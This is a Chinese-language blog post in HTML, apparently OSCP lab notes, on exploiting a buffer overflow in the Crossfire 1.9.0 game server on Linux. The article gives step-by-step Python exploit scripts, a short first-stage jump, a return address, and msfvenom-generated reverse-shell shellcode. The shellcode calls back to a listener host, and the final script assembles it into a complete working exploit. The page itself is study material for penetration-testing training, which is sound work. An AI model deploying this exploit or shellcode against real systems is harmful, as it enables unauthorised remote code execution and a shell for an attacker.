@@ -1,0 +1,764 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Linux缓冲区溢出相关">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux缓冲区溢出">
+<meta property="og:url" content="https://c47sh4rk.github.io/2022/08/15/Linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="Linux缓冲区溢出相关">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815164543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815165124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815165544.png">
+<meta property="article:published_time" content="2022-08-15T03:22:57.000Z">
+<meta property="article:modified_time" content="2023-02-26T08:05:47.000Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="OSCP">
+<meta property="article:tag" content="漏洞挖掘">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815164543.png">
+  
+  
+  
+  <title>Linux缓冲区溢出 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux缓冲区溢出"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-15 11:22" pubdate>
+          2022年8月15日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux缓冲区溢出</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="Linux缓冲区溢出"><a href="#Linux缓冲区溢出" class="headerlink" title="Linux缓冲区溢出"></a>Linux缓冲区溢出</h1><ol>
+<li>EIP</li>
+<li>BadChar</li>
+<li>JMP ESP(mona)</li>
+<li>EXP</li>
+</ol>
+<h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><ul>
+<li>Crossfire 是一个基于Linux系统的在线多人角色扮演游戏</li>
+<li>Crossfire 1.9.0存在基于网络的缓冲区溢出漏洞<ul>
+<li>漏洞指令: setup sound</li>
+<li>溢出长度: 4000字节</li>
+</ul>
+</li>
+<li>调试工具 EDB<ul>
+<li>灵感崽子Ollydbg</li>
+</ul>
+</li>
+<li>32位程序<ul>
+<li>使用32位Kali Linux动态调试</li>
+</ul>
+</li>
+</ul>
+<h2 id="DEP-ALSR-amp-Canaries"><a href="#DEP-ALSR-amp-Canaries" class="headerlink" title="DEP, ALSR &amp; Canaries"></a>DEP, ALSR &amp; Canaries</h2><h3 id="DEP-ALSR-Canaries"><a href="#DEP-ALSR-Canaries" class="headerlink" title="DEP, ALSR, Canaries"></a>DEP, ALSR, Canaries</h3><ul>
+<li>最新版Linux内核以及编译器都采用了不同的内存保护技术</li>
+<li>DEP(数据执行保护)</li>
+<li>ASLR(地址空间布局随机化)</li>
+<li>Stack Canaries(堆栈溢出保护技术)</li>
+</ul>
+<h2 id="测定EIP溢出偏移量"><a href="#测定EIP溢出偏移量" class="headerlink" title="测定EIP溢出偏移量"></a>测定EIP溢出偏移量</h2><h3 id="程序崩溃复现"><a href="#程序崩溃复现" class="headerlink" title="程序崩溃复现"></a>程序崩溃复现</h3><ul>
+<li>执行攻击脚本</li>
+<li>生成字符序列<ul>
+<li><code>msf-pattern_create -l 4379</code></li>
+</ul>
+</li>
+<li>替换crash变量内容, 再次执行exp, 测定EIP溢出位置(偏移)<ul>
+<li><code>msf-pattern_offset -q 46367046</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br><br>crash = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">4379</span><br><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + crash + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>))<br><span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br><br>s.send(buffer)<br>s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815164543.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h2 id="ShellCode位置"><a href="#ShellCode位置" class="headerlink" title="ShellCode位置"></a>ShellCode位置</h2><h3 id="返回地址"><a href="#返回地址" class="headerlink" title="返回地址"></a>返回地址</h3><ul>
+<li>找到崩溃时指向缓冲区的寄存器, 搜索JMP、CALL此寄存器的指令, 实现修改程序流</li>
+<li>ESP寄存器只有7个字符长度可用, 多一个字节都会导致EIP修改失败</li>
+<li>发现EAX寄存器指向堆栈顶部<ul>
+<li>跳过”setup sound”则可以到达自定义注入区域AAAAA……</li>
+</ul>
+</li>
+<li>向ESP指向的7个字节堆栈注入add eax,12、JMP EAX<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815165124.png" srcset="/img/loading.gif" lazyload><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br>padding = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">4368</span><br><br>eip = <span class="hljs-string">&quot;\x42\x42\x42\x42&quot;</span><br><br>first_stage = <span class="hljs-string">&quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</span><br><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + padding + eip + first_stage + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>)) <span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br>s.send(buffer) s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="检查坏字符"><a href="#检查坏字符" class="headerlink" title="检查坏字符"></a>检查坏字符</h3><ul>
+<li>与 Windows 缓冲区溢出模块中的方法相同</li>
+<li>仅找到为 \x00 和 \x20</li>
+</ul>
+<h2 id="返回地址-1"><a href="#返回地址-1" class="headerlink" title="返回地址"></a>返回地址</h2><h3 id="找到返回地址"><a href="#找到返回地址" class="headerlink" title="找到返回地址"></a>找到返回地址</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815165544.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br><br>padding = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">4368</span><br>eip = <span class="hljs-string">&quot;\x96\x45\x13\x08&quot;</span><br>first_stage = <span class="hljs-string">&quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</span><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + padding + eip + first_stage + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>)) <span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br>s.send(buffer) s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><ul>
+<li>msf生成payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs zsh">kali@kali:~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b &quot;\x0 0\x20&quot; -f py -v shellcode<br>[-] No platform was selected, choosing<br>Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload<br>Found 11 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 95 (iteration=0) x86/shikata_ga_nai chosen with final size 95<br>Payload size: 95 bytes<br>Final size of py file: 470 bytes<br>shellcode = &quot;&quot;<br>shellcode += &quot;\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29&quot;<br>shellcode += &quot;\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41&quot;<br>shellcode += &quot;\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71&quot;<br>shellcode += &quot;\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04&quot;<br>shellcode += &quot;\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d&quot;<br>shellcode += &quot;\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72&quot;<br>shellcode += &quot;\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34&quot;<br>shellcode += &quot;\x7f\x6d\x02\x36&quot;<br></code></pre></td></tr></table></figure></li>
+<li>最终poc<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br><br>host = <span class="hljs-string">&quot;10.11.0.128&quot;</span><br>nop_sled = <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">8</span> <span class="hljs-comment"># NOP sled</span><br><br>shellcode = <span class="hljs-string">&quot;&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xbe\x35\x9e\xa3\x7d\xd9\xe8\xd9\x74\x24\xf4\x5a\x29&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xc9\xb1\x12\x31\x72\x12\x83\xc2\x04\x03\x47\x90\x41&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x88\x96\x77\x72\x90\x8b\xc4\x2e\x3d\x29\x42\x31\x71&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x4b\x99\x32\xe1\xca\x91\x0c\xcb\x6c\x98\x0b\x2a\x04&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xb7\xfc\xb8\x46\xaf\xfe\x40\x67\x8b\x76\xa1\xd7\x8d&quot;</span><br>shellcode += <span class="hljs-string">&quot;\xd8\x73\x44\xe1\xda\xfa\x8b\xc8\x5d\xae\x23\xbd\x72&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x3c\xdb\x29\xa2\xed\x79\xc3\x35\x12\x2f\x40\xcf\x34&quot;</span><br>shellcode += <span class="hljs-string">&quot;\x7f\x6d\x02\x36&quot;</span><br><br>padding = <span class="hljs-string">&quot;\x41&quot;</span> * (<span class="hljs-number">4368</span> - <span class="hljs-built_in">len</span>(nop_sled) - <span class="hljs-built_in">len</span>(shellcode))<br><br>eip = <span class="hljs-string">&quot;\x96\x45\x13\x08&quot;</span> <span class="hljs-comment"># 0x08134596</span><br>first_stage = <span class="hljs-string">&quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</span><br>buffer = <span class="hljs-string">&quot;\x11(setup sound &quot;</span> + padding + eip + first_stage + <span class="hljs-string">&quot;\x90\x00#&quot;</span><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Sending evil buffer...&quot;</span><br><br>s.connect((host, <span class="hljs-number">13327</span>)) <span class="hljs-built_in">print</span> s.recv(<span class="hljs-number">1024</span>)<br>s.send(buffer) s.close()<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*]Payload Sent !&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这次buffer overflow的程序有几个注意点</strong></p>
+<ol>
+<li>这个程序超过4379个字符注入时会直接崩溃</li>
+<li>ESP寄存器只有7个字符长度可用, 所以得考虑跳到别的寄存器来注入payload</li>
+<li>EIP 跳到 ESP的地址 然后 ESP地址写入跳转到EAX的指令 在EAX注入payload</li>
+<li>Try Harder!</li>
+</ol>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/OSCP-Notes/" class="category-chain-item">OSCP-Notes</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+        <a href="/tags/OSCP/">#OSCP</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">#漏洞挖掘</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Linux缓冲区溢出</div>
+      <div>https://c47sh4rk.github.io/2022/08/15/Linux缓冲区溢出/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月15日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/16/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/" title="客户端攻击">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">客户端攻击</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/13/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" title="Windows缓冲区溢出">
+                        <span class="hidden-mobile">Windows缓冲区溢出</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
